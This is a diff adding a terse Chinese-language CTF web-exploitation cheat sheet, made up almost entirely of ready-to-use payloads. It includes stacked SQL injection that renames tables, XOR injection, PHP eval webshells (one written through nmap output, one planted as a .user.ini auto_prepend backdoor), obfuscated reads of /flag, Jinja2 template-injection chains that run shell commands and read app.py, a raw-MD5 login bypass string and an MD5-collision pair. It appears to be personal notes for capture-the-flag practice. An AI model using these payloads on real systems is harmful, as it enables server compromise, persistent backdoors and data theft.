@@ -1,0 +1,49 @@
+0.基础
+    正则表达式的匹配
+    dirb扫网站目录
+    www.zip源码泄露
+
+1.sql
+    fuzz测试
+    set sql_mode=PIPES_AS_CONCAT
+   堆叠注入#;
+    通过show来查东西
+    alter调整表结构1;rename table words to word1;rename table 1919810931114514 to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#
+异或注入：
+  1^1^1
+ ascii 32-127
+'Content-Type': 'application/x-www-form-urlencoded'
+
+
+
+2.命令执行
+    escapeshellarg() 转义
+    escapeshellcmd（）转义          ' <?php @eval($_POST['mzi']);?> '
+    nmap -oG 1.php 用nmap写马
+
+vardump()
+print_r()
+scandir(chr(47))
+file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
+
+$$ {}
+
+ssti模板注入：{{''.__class__.__mro__[1].__subclasses__()[169].__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")}}
+
+
+
+
+3.文件上传
+.user.ini隐藏后门
+auto_prepend_file=a.jpg
+a.jpg:
+    <script language='php'> @eval($_POST['pass']);</script>
+
+
+php md5（$pass,true） 万能密码ffifdyop
+MD5强绕过？？
+a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
+b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}
+
